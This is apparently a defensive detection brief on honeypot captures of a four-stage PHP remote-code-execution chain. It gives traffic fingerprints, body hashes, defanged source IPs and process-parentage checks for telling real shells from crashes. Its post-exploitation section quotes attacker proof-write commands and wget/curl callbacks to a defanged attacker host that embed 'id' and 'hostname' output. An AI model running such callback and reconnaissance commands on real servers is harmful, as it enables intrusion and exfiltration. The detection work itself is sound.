# Honeypot RCE evidence — 35 confirmed shells (24 Oct 2026)

**Source:** `0x4D31/honeypot-data`, `reports/php2shell/2026-10-24-confirmed-rce.md` and
`reports/php2shell/2026-10-24-rce-evidence/` (public dataset, HTTP packet captures plus Apache, PHP,
Tetragon and signal records for every case, `A01`–`A03`, `B01`–`B32`). Author: Adel Karimi (0x4D31).
**Collected:** 22 to 24 October 2026. **Read:** 27 October 2026.

This is the primary evidence behind the "35 shells on honeypots" reporting. It is included here because it
gives detection teams something the second-hand coverage did not: **fixed request-body digests, exact body
sizes, the absence of a User-Agent, and the process-parentage condition that separates real RCE from a
crash.**

## What was proven, and what was not

| Proven | Not proven |
|---|---|
| 35 execution-stage POSTs correlated with **35 `/bin/sh` starts parented by Apache workers** (`uid=33`) across three targets | Exploitation of CVE-2026-109619's distinct path (evidence is consistent with **CVE-2026-109618** only) |
| Two source clusters: **3 shells** from `15.204.59[.]70`, **32** from `162.35.99[.]94` | Attribution: two source clusters are not two actors |
| Leak-guided ASLR adjustment per target (dominant leaked pointer differs; B2 body tracks it) | Exact client or PoC revision used |
| Four-stage chain matching the public 9bie HTTP-only PoC family | Reliability on multi-worker pools, other PHP builds, or applications (single-worker mod_php only) |

The honeypots were deliberately favourable: **single-worker Apache mod_php**. Our own benchmark of the
public tool found 15/15 on that profile and 2/13 on default multi-worker, so this dataset confirms the
strongest case, not the average one.

## Network fingerprint (highest-value signals first)

1. **Multipart POST to `/` or `/index.php` with NO `User-Agent` header.** Observed on every confirmed chain.
2. **Ten-character `C` boundary:** `Content-Type: multipart/form-data; boundary=CCCCCCCCCC` — the same
   constant the public JoasASantos tool hardcodes, and exactly what our Suricata SID 2202610123 keys on.
   This is the first in-the-wild validation of that rule.
3. **Header order:** `Host → Content-Type → Transfer-Encoding → Connection` (chunked stages) and
   `Host → Content-Type → Content-Length → Connection` (fixed-length stages).
4. **Four-stage size sequence** (decoded body sizes, not wire sizes):

| Stage | Shape | Decoded size | Field families |
|---|---|---|---|
| A1 memory pressure | chunked multipart, ~973 parts | **1,060,211 B** | mostly `files*` |
| B1 disclosure | chunked multipart, ~918 parts | **33,128,677 B** | mostly `x*` |
| A2 memory pressure | fixed-length multipart, ~997 parts | **279,369 B** | mostly `files*` |
| B2 execution | fixed-length multipart, ~998 parts | **451,384 B** | `s*` and `t*` |

All four stages carry `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` fields. A1 may also carry five numbered
`q...=v` query parameters. B1 responses contain an **819,200-byte URL-decoded `PHPSESSID` cookie** — the
memory-disclosure payload.

5. **Body digests (decoded multipart bodies, for exact matching):**

| Body | SHA-256 |
|---|---|
| A1 | `8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6` |
| B1 | `b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2` |
| A2 | `7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236` |

B2 digests change with the target's leaked address and the shell command. The full per-case list (16
digests) is in the source report. Matching requires decoded-body capture or a proxy that can hash bodies;
edges that log only headers will not see these.

## Source infrastructure (defanged)

| Address | Role |
|---|---|
| `15.204.59[.]70` | Episode A, 3 confirmed shells on one target; proof writes then `wget` to port 8081 (`/ok33`) |
| `162.35.99[.]94` | Episode B, 32 confirmed shells across three targets; callbacks to ports **80** and **8080** with `/pwn-<target>`, `/PROOF-...`, `/ID-...` paths |
| `104.28.208[.]84` | Exploit-shaped requests only; **no** shell, no disclosure cookie. Attempt indicator, not RCE |
| `144.48.4[.]242` | Same: attempt indicator, not confirmed RCE |

Do not block on IP alone without checking for the boundary/fingerprint: the dataset itself shows
attempt-shaped traffic that never executed.

## Post-exploitation command patterns (14 distinct)

- Proof writes: `id>/tmp/x1; for d in /var/www/html /var/www; do id>$d/p1; done`
- Call-back proof: `wget -q http://15.204.59[.]70:8081/ok33`
- Beacon via PHP CLI, curl or wget to `162.35.99[.]94` port 80/8080, with proof URLs embedding
  `$(id -un)`, `$(hostname)`, `$(uname -m)`
- Observed failures that confirm a shell ran: `sh: 1: wget: not found`, and Apache `Read-only file system`
  on web-root writes
- No second-stage file was recovered

## Process-level confirmation (the decisive signal)

`apache2` worker → **`/bin/sh`** (uid 33) → `id` / `php` / `curl` / `wget` child. Confirmed with Tetragon
`process_exec` parentage, with matching packet source ports. Examples: `apache2 → /bin/sh → /usr/bin/curl`
followed by `tcp_connect` to `162.35.99[.]94:8080`.

**A worker OOM, an oversized `PHPSESSID` or `AH00051` alone is not RCE.** The decisive difference is an
unexpected Apache-parent shell, ideally followed by an independently observed `id`, `php` or `curl` child.

## Limitations worth repeating to customers

- Single-worker mod_php profile only.
- Packet capture cannot identify the exact exploit client or revision.
- Early successful chains contained no disclosed pointer above the public 9bie filter threshold
  (`0x7f0000000000`), so either a modified PoC, a different revision or a different client was used. The
  dataset does not claim a specific variant.
- Evidence is consistent with CVE-2026-109618; it does not demonstrate a separate CVE-2026-109619 path.

## Containment note

The dataset is public and contains packet captures of attacker traffic. It contains **no working exploit
code**, and the digests above are hashes, not payloads. Do not paste attacker command bodies into shared
tickets without defanging embedded addresses.
